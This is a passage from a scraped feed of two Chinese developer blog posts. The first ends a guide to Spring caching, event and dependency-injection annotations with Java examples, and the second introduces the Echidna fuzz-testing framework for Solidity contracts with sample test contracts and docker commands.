       <span class="hljs-comment">// 自定义不同缓存的过期时间</span>
       Map&lt;String, RedisCacheConfiguration&gt; cacheConfigs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
       cacheConfigs.put(<span class="hljs-string">"userCache"</span>, config.entryTtl(Duration.ofHours(<span class="hljs-number">1</span>)));
       cacheConfigs.put(<span class="hljs-string">"productCache"</span>, config.entryTtl(Duration.ofMinutes(<span class="hljs-number">10</span>)));
       <span class="hljs-keyword">return</span> RedisCacheManager.builder(connectionFactory)
               .cacheDefaults(config)
               .withInitialCacheConfigurations(cacheConfigs)
               .build();
   }
}
</code></pre>
<h4 data-id="heading-60">（2）核心缓存注解</h4>



































<table><thead><tr><th>注解            </th><th>作用                              </th><th>核心属性                                                            </th></tr></thead><tbody><tr><td><code>@Cacheable</code>  </td><td>查询缓存：存在则返回缓存，不存在则执行方法并缓存结果      </td><td><code>value</code>（缓存名称）、<code>key</code>（缓存键，SpEL 表达式）、<code>condition</code>（缓存条件）              </td></tr><tr><td><code>@CachePut</code>    </td><td>更新缓存：执行方法后更新缓存（不查询缓存）          </td><td>同<code>@Cacheable</code>，用于新增 / 修改操作                                        </td></tr><tr><td><code>@CacheEvict</code>  </td><td>删除缓存：执行方法后删除指定缓存                </td><td>同<code>@Cacheable</code>，<code>allEntries</code>（是否删除所有缓存）、<code>beforeInvocation</code>（是否执行前删除）</td></tr><tr><td><code>@Caching</code>    </td><td>组合缓存：一个方法配置多个缓存注解              </td><td><code>cacheable</code>、<code>put</code>、<code>evict</code>（数组形式）                                  </td></tr><tr><td><code>@CacheConfig</code></td><td>类级缓存配置：统一指定<code>value</code>（缓存名称），方法级可覆盖</td><td><code>value</code>（默认缓存名称）                                                  </td></tr></tbody></table>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-meta">@CacheConfig(value = "productCache")</span> <span class="hljs-comment">// 类级：默认缓存名称</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductService</span> {
   <span class="hljs-comment">// 查询缓存：key为产品ID，条件为ID&gt;0</span>
   <span class="hljs-meta">@Cacheable(key = "#id", condition = "#id &gt; 0")</span>
   <span class="hljs-keyword">public</span> ProductDTO <span class="hljs-title function_">getProductById</span><span class="hljs-params">(Long id)</span> {
       <span class="hljs-comment">// 缓存不存在时执行：查询数据库</span>
       <span class="hljs-keyword">return</span> productMapper.selectById(id);
   }
   <span class="hljs-comment">// 更新缓存：新增产品后缓存结果（key为返回的ID）</span>
   <span class="hljs-meta">@CachePut(key = "#result.id")</span>
   <span class="hljs-keyword">public</span> ProductDTO <span class="hljs-title function_">addProduct</span><span class="hljs-params">(ProductForm form)</span> {
       <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>();
       BeanUtils.copyProperties(form, product);
       productMapper.insert(product);
       <span class="hljs-type">ProductDTO</span> <span class="hljs-variable">dto</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProductDTO</span>();
       BeanUtils.copyProperties(product, dto);
       <span class="hljs-keyword">return</span> dto;
   }
   <span class="hljs-comment">// 删除缓存：删除产品后删除对应缓存，同时清空所有产品列表缓存</span>
   <span class="hljs-meta">@Caching(evict = {
       @CacheEvict(key = "#id"), // 删除单个产品缓存
       @CacheEvict(value = "productListCache", allEntries = true) // 清空列表缓存
   })</span>
   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteProduct</span><span class="hljs-params">(Long id)</span> {
       productMapper.deleteById(id);
   }
   <span class="hljs-comment">// 条件缓存：查询列表时缓存，条件为分类ID不为空</span>
   <span class="hljs-meta">@Cacheable(value = "productListCache", key = "#categoryId", condition = "#categoryId != null")</span>
   <span class="hljs-keyword">public</span> List&lt;ProductDTO&gt; <span class="hljs-title function_">getProductByCategoryId</span><span class="hljs-params">(Long categoryId)</span> {
       <span class="hljs-keyword">return</span> productMapper.selectByCategoryId(categoryId);
   }
}
</code></pre>
<h3 data-id="heading-61">3. 事件相关注解</h3>
<h4 data-id="heading-62">（1）@EventListener</h4>
<p><code>@EventListener</code> 标注方法为 Spring 事件监听器，监听指定类型的事件。</p>
<ul>
<li>核心场景：解耦业务逻辑（如订单创建后触发库存扣减、日志记录等）；</li>
<li>支持事件：Spring 内置事件（如<code>ContextRefreshedEvent</code>）或自定义事件。</li>
</ul>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 1. 定义自定义事件（继承ApplicationEvent）</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderCreatedEvent</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ApplicationEvent</span> {
   <span class="hljs-keyword">private</span> OrderDTO orderDTO;
   <span class="hljs-keyword">public</span> <span class="hljs-title function_">OrderCreatedEvent</span><span class="hljs-params">(Object source, OrderDTO orderDTO)</span> {
       <span class="hljs-built_in">super</span>(source);
       <span class="hljs-built_in">this</span>.orderDTO = orderDTO;
   }
   <span class="hljs-comment">// getter/setter</span>
}
<span class="hljs-comment">// 2. 发布事件（在业务方法中）</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
   <span class="hljs-meta">@Autowired</span>
   <span class="hljs-keyword">private</span> ApplicationEventPublisher eventPublisher;
   <span class="hljs-meta">@Transactional</span>
   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrder</span><span class="hljs-params">(OrderDTO orderDTO)</span> {
       <span class="hljs-comment">// 订单创建逻辑</span>
       orderMapper.insert(orderDTO);
       <span class="hljs-comment">// 发布事件（异步发布需配合@Async）</span>
       eventPublisher.publishEvent(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderCreatedEvent</span>(<span class="hljs-built_in">this</span>, orderDTO));
   }
}
<span class="hljs-comment">// 3. 监听事件（多个监听器可同时监听）</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderEventListener</span> {
   <span class="hljs-comment">// 同步监听：与发布事件的事务同线程</span>
   <span class="hljs-meta">@EventListener(OrderCreatedEvent.class)</span>
   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleOrderCreated</span><span class="hljs-params">(OrderCreatedEvent event)</span> {
       <span class="hljs-type">OrderDTO</span> <span class="hljs-variable">orderDTO</span> <span class="hljs-operator">=</span> event.getOrderDTO();
       <span class="hljs-comment">// 执行后续逻辑：如日志记录</span>
       logService.recordOrderLog(orderDTO.getId(), <span class="hljs-string">"订单创建成功"</span>);
   }
   <span class="hljs-comment">// 异步监听：通过@Async指定线程池，不阻塞主线程</span>
   <span class="hljs-meta">@Async("taskExecutor")</span>
   <span class="hljs-meta">@EventListener(OrderCreatedEvent.class)</span>
   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleInventoryDeduct</span><span class="hljs-params">(OrderCreatedEvent event)</span> {
       <span class="hljs-type">OrderDTO</span> <span class="hljs-variable">orderDTO</span> <span class="hljs-operator">=</span> event.getOrderDTO();
       <span class="hljs-comment">// 异步执行：库存扣减</span>
       inventoryService.deduct(orderDTO.getProductId(), orderDTO.getQuantity());
   }
}
</code></pre>
<h4 data-id="heading-63">（2）@TransactionalEventListener</h4>
<p><code>@TransactionalEventListener</code> 是<code>@EventListener</code>的事务增强版，支持事务生命周期绑定。</p>
<ul>
<li>核心特性：事件触发时机与事务状态关联（如事务提交后、回滚后），避免事务未提交时触发后续逻辑。</li>
</ul>
<p><strong>属性说明：</strong></p>




















<table><thead><tr><th>属性名</th><th>说明</th><th>补充说明</th></tr></thead><tbody><tr><td>phase</td><td>事务阶段</td><td>枚举值：<code>BEFORE_COMMIT</code>（提交前）、<code>AFTER_COMMIT</code>（提交后，默认）、<code>AFTER_ROLLBACK</code>（回滚后）、<code>AFTER_COMPLETION</code>（完成后，无论提交 / 回滚）</td></tr><tr><td>fallbackExecution</td><td>无事务时是否执行</td><td>① <code>true</code>：无事务时也执行；② <code>false</code>（默认）：仅事务中执行</td></tr></tbody></table>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderEventListener</span> {
   <span class="hljs-comment">// 事务提交后执行：确保订单创建成功后再发送通知</span>
   <span class="hljs-meta">@TransactionalEventListener(
       value = OrderCreatedEvent.class,
       phase = TransactionPhase.AFTER_COMMIT,
       fallbackExecution = false
   )</span>
   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendOrderNotice</span><span class="hljs-params">(OrderCreatedEvent event)</span> {
       <span class="hljs-type">OrderDTO</span> <span class="hljs-variable">orderDTO</span> <span class="hljs-operator">=</span> event.getOrderDTO();
       <span class="hljs-comment">// 事务提交后执行：发送短信/邮件通知</span>
       noticeService.send(orderDTO.getUserId(), <span class="hljs-string">"您的订单已创建成功，订单号："</span> + orderDTO.getOrderNo());
   }
}
</code></pre>
<h3 data-id="heading-64">4. 依赖注入相关补充注解</h3>
<h4 data-id="heading-65">（1）@Resource（JSR-250）</h4>
<p><code>@Resource</code> 是 JSR-250 标准注解，用于依赖注入，与<code>@Autowired</code>功能类似，区别如下：</p>
<ul>
<li><code>@Autowired</code>：Spring 提供，按类型注入，需配合<code>@Qualifier</code>指定名称；</li>
<li><code>@Resource</code>：JDK 标准，默认按名称注入，名称匹配失败则按类型注入。</li>
</ul>
<p><strong>属性说明：</strong></p>

























<table><thead><tr><th>属性名</th><th>说明</th><th>补充说明</th></tr></thead><tbody><tr><td>name</td><td>注入 Bean 的名称</td><td>如<code>name = "userService"</code>，优先按名称匹配</td></tr><tr><td>type</td><td>注入 Bean 的类型</td><td>如<code>type = UserService.class</code>，按类型匹配</td></tr><tr><td>lookup</td><td>查找方式</td><td>仅用于 EJB，Spring 中很少使用</td></tr></tbody></table>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
   <span class="hljs-comment">// 按名称注入（Bean名称为userService）</span>
   <span class="hljs-meta">@Resource(name = "userService")</span>
   <span class="hljs-keyword">private</span> UserService userService;
   <span class="hljs-comment">// 按类型注入（仅当存在唯一UserMapper类型Bean时生效）</span>
   <span class="hljs-meta">@Resource(type = UserMapper.class)</span>
   <span class="hljs-keyword">private</span> UserMapper userMapper;
   <span class="hljs-comment">// 无属性：默认按字段名（orderMapper）匹配Bean名称</span>
   <span class="hljs-meta">@Resource</span>
   <span class="hljs-keyword">private</span> OrderMapper orderMapper;
}
</code></pre>
<h4 data-id="heading-66">（2）@Inject（JSR-330）</h4>
<p><code>@Inject</code> 是 JSR-330 标准注解，用于依赖注入，功能与<code>@Autowired</code>类似，需引入<code>javax.inject</code>依赖。</p>
<ul>
<li>特点：无属性，仅按类型注入，需配合<code>@Named</code>指定 Bean 名称。</li>
</ul>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 引入依赖（Maven） --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.inject<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javax.inject<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
   <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductService</span> {
   <span class="hljs-comment">// 按类型注入</span>
   <span class="hljs-meta">@Inject</span>
   <span class="hljs-keyword">private</span> ProductMapper productMapper;
   <span class="hljs-comment">// 按名称注入（配合@Named）</span>
   <span class="hljs-meta">@Inject</span>
   <span class="hljs-meta">@Named("userService")</span>
   <span class="hljs-keyword">private</span> UserService userService;
}
</code></pre>
<h2 data-id="heading-67">七、注解使用注意事项总结</h2>
<ol>
<li><strong>代理失效问题</strong>：</li>
</ol>
<ul>
<li><code>@Transactional</code>、<code>@Async</code>、<code>@Cacheable</code>等注解依赖 Spring AOP 代理，同一类中方法调用会导致代理失效；</li>
<li>解决方案：通过<code>ApplicationContext</code>获取 Bean 调用，或拆分业务逻辑到不同类。</li>
</ul>
<ol start="2">
<li><strong>事务相关注意</strong>：</li>
</ol>
<ul>
<li><code>@Transactional</code>默认仅回滚<code>RuntimeException</code>，检查型异常（如<code>SQLException</code>）需通过<code>rollbackFor</code>指定；</li>
<li>多数据源场景需通过<code>transactionManager</code>属性指定对应的事务管理器。</li>
</ul>
<ol start="3">
<li><strong>缓存相关注意</strong>：</li>
</ol>
<ul>
<li><code>@Cacheable</code>的<code>key</code>需使用 SpEL 表达式（如<code>#id</code>），避免硬编码；</li>
<li>缓存对象需实现序列化（如 Redis 缓存时），否则会抛出序列化异常。</li>
</ul>
<ol start="4">
<li><strong>权限注解注意</strong>：</li>
</ol>
<ul>
<li>Spring Security 6 + 推荐使用<code>@EnableMethodSecurity</code>替代旧版<code>@EnableGlobalMethodSecurity</code>；</li>
<li><code>@Secured</code>注解的角色名称默认需带<code>ROLE_</code>前缀，可通过配置<code>rolePrefix = ""</code>取消前缀。</li>
</ul>
<ol start="5">
<li><strong>依赖注入选择</strong>：</li>
</ol>
<ul>
<li>优先使用<code>@Autowired</code>（Spring 原生，支持更多特性）；</li>
<li>跨框架兼容场景可使用<code>@Resource</code>（JSR-250）或<code>@Inject</code>（JSR-330）。</li>
</ul>
<p>通过本文整理的 Spring 核心注解，可覆盖大多数开发场景，合理使用注解能大幅简化配置、解耦业务逻辑，提升开发效率。实际开发中需结合具体场景选择合适的注解，并注意避免常见陷阱（如代理失效、事务回滚异常等）。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[3分钟Solidity: 13.1 Echidna测试框架]]></title>    <link>https://juejin.cn/post/7596905015367417856</link>    <guid>https://juejin.cn/post/7596905015367417856</guid>    <pubDate>2026-01-19T23:13:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596905015367417856" data-draft-id="7596906473306456114" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="3分钟Solidity: 13.1 Echidna测试框架"/> <meta itemprop="keywords" content="Solidity,web3,智能合约"/> <meta itemprop="datePublished" content="2026-01-19T23:13:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Rockbean"/> <meta itemprop="url" content="https://juejin.cn/user/4054654615823560"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            3分钟Solidity: 13.1 Echidna测试框架
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4054654615823560/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Rockbean
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T23:13:12.000Z" title="Mon Jan 19 2026 23:13:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>欢迎订阅专栏</strong>：<a href="https://juejin.cn/column/7578762210285977663" title="https://juejin.cn/column/7578762210285977663" target="_blank">3分钟Solidity--智能合约--Web3区块链技术必学</a></p>
<h2 data-id="heading-0">Echidna</h2>
<p>要获取此内容的最新版本，请访问 Cyfrin.io 上的 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.cyfrin.io%2Fglossary%2Fechidna-fuzz-testing-solidity-code-example" target="_blank" title="https://www.cyfrin.io/glossary/echidna-fuzz-testing-solidity-code-example" ref="nofollow noopener noreferrer">Echidna（代码示例）</a></p>
<p><strong>Echidna是一个快速的智能合约（solidity）模糊测试框架</strong>，它是用Haskell语言编写的程序，实现基于以太坊智能合约属性的模糊测试。 它使用基于合约ABI的复杂的grammar-based模糊测试来验证用户定义断言或者Solidity断言。 Echidna在设计时考虑了模块化，可以很容易地被扩展成包含新的变种或者在特定情况下，测试特定合约。</p>
<p>使用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcrytic%2Fechidna" target="_blank" title="https://github.com/crytic/echidna" ref="nofollow noopener noreferrer">Echidna</a>进行模糊测试的示例。</p>
<ol>
<li>将 Solidity 合约保存为 <code>TestEchidna.sol</code></li>
<li>在存储合约的文件夹中执行以下命令。</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">docker run -it --<span class="hljs-built_in">rm</span> -v <span class="hljs-variable">$PWD</span>:/code trailofbits/eth-security-toolbox
</code></pre>
<p>在 Docker 中，您的代码将存储在根目录下的 <code>/code</code>文件夹中。</p>
<ol start="3">
<li>查看以下注释并执行 <code>echidna</code>命令。</li>
</ol>
<pre><code class="hljs language-php" lang="php"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
pragma solidity ^<span class="hljs-number">0.8</span>.<span class="hljs-number">26</span>;

<span class="hljs-comment">/*
echidna TestEchidna.sol --contract TestCounter
*/</span>
contract Counter {
    uint256 <span class="hljs-keyword">public</span> count;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">inc</span>(<span class="hljs-params"/>) <span class="hljs-title">external</span> </span>{
        count += <span class="hljs-number">1</span>;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dec</span>(<span class="hljs-params"/>) <span class="hljs-title">external</span> </span>{
        count -= <span class="hljs-number">1</span>;
    }
}

contract TestCounter is Counter {
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">echidna_test_true</span>(<span class="hljs-params"/>) <span class="hljs-title">public</span> <span class="hljs-title">view</span> <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-keyword">bool</span></span>) </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">echidna_test_false</span>(<span class="hljs-params"/>) <span class="hljs-title">public</span> <span class="hljs-title">view</span> <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-keyword">bool</span></span>) </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">echidna_test_count</span>(<span class="hljs-params"/>) <span class="hljs-title">public</span> <span class="hljs-title">view</span> <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-keyword">bool</span></span>) </span>{
        <span class="hljs-comment">// 这里我们在测试Counter.count应该始终&lt;=5。</span>
        <span class="hljs-comment">// 测试将失败。Echidna足够聪明，会调用Counter.inc()</span>
        <span class="hljs-comment">// 超过5次。</span>
        <span class="hljs-keyword">return</span> count &lt;= <span class="hljs-number">5</span>;
    }
}

<span class="hljs-comment">/*
echidna TestEchidna.sol --contract TestAssert --test-mode assertion
*/</span>
contract TestAssert {
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test_assert</span>(<span class="hljs-params">uint256 _i</span>) <span class="hljs-title">external</span> </span>{
        <span class="hljs-title function_ invoke__">assert</span>(_i &lt; <span class="hljs-number">10</span>);
    }

    <span class="hljs-comment">// 更复杂的例子</span>
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">abs</span>(<span class="hljs-params">uint256 x, uint256 y</span>) <span class="hljs-title">private</span> <span class="hljs-title">pure</span> <span class="hljs-title">returns</span> (<span class="hljs-params">uint256</span>) </span>{
        <span class="hljs-keyword">if</span> (x &gt;= y) {
            <span class="hljs-keyword">return</span> x - y;
        }
        <span class="hljs-keyword">return</span> y - x;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test_abs</span>(<span class="hljs-params">uint256 x, uint256 y</span>) <span class="hljs-title">external</span> </span>{
        uint256 z = <span class="hljs-title function_ invoke__">abs</span>(x, y);
        <span class="hljs-keyword">if</span> (x &gt;= y) {
            <span class="hljs-title function_ invoke__">assert</span>(z &lt;= x);
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-title function_ invoke__">assert</span>(z &lt;= y);
        }
    }
}
</code></pre>
<h3 data-id="heading-1">测试时间与发送者</h3>
<p>Echidna可以对时间戳进行模糊测试。时间戳范围可在配置中设置，默认为7天。</p>
<p>合约调用者同样可在配置中设置。默认账户为：</p>
<ul>
<li><code>0x10000</code></li>
<li><code>0x20000</code></li>
<li><code>0x30000</code></li>
</ul>
<pre><code class="hljs language-ini" lang="ini">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26<span class="hljs-comment">;</span>

/*
docker run -it --rm -v $PWD:/code trailofbits/eth-security-toolbox
echidna EchidnaTestTimeAndCaller.sol --contract EchidnaTestTimeAndCaller
*/
contract EchidnaTestTimeAndCaller {
    bool private <span class="hljs-attr">pass</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
    uint256 private <span class="hljs-attr">createdAt</span> = block.timestamp<span class="hljs-comment">;</span>

    /*
    如果Echidna能够调用setFail()，测试将失败
    否则测试将通过
    */
    function echidna_test_pass() public view returns (bool) {
        return pass<span class="hljs-comment">;</span>
    }

    function setFail() external {
        /*
        如果延迟小于等于最大区块延迟，Echidna可以调用此函数。
        否则，Echidna将无法调用此函数。
        最大区块延迟可以通过在配置文件中指定来延长。
        */
        uint256 <span class="hljs-attr">delay</span> = <span class="hljs-number">7</span> days<span class="hljs-comment">;</span>
        require(block.timestamp &gt;= createdAt + delay)<span class="hljs-comment">;</span>
        <span class="hljs-attr">pass</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
    }

    // 默认sender
    // 更改地址以查看测试失败
    address<span class="hljs-section">[3]</span> private <span class="hljs-attr">senders</span> =
        <span class="hljs-section">[address(0x10000), address(0x20000), address(0x30000)]</span><span class="hljs-comment">;</span>

    address private <span class="hljs-attr">sender</span> = msg.sender<span class="hljs-comment">;</span>

    // 将 _sender 作为输入，并要求 <span class="hljs-attr">msg.sender</span> == _sender
    // 以 _sender 为例进行反证
    function setSender(address _sender) external {
        require(<span class="hljs-attr">_sender</span> == msg.sender)<span class="hljs-comment">;</span>
        <span class="hljs-attr">sender</span> = msg.sender<span class="hljs-comment">;</span>
    }

    // 检查默认发件人。发件人应为3个默认账户之一。
    function echidna_test_sender() public view returns (bool) {
        for (uint256 i<span class="hljs-comment">; i &lt; 3; i++) {</span>
            if (<span class="hljs-attr">sender</span> == senders[i]) {
                return true<span class="hljs-comment">;</span>
            }
        }
        return false<span class="hljs-comment">;</span>
    }
}
</code></pre>
<h3 data-id="heading-2">Try on Remix</h3>
<ul>
